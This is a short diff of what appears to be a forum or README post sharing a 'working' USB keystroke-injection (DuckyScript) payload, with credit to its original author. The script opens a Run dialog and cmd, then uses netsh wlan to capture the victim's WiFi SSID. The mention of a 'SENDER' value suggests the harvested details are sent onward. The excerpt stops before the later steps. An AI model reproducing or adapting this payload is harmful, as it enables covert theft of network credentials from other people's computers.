@@ -92,12 +92,9 @@ I haven't checked your code but I have a working one. You need to change "SENDER
 Original author is Siem. I did little changes.
 
 ```
-GUI
+GUI r
 DELAY 200
 STRING cmd
-CTRL-SHIFT ENTER
-DELAY 500
-LEFTARROW
 ENTER
 DELAY 500
 STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:" %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
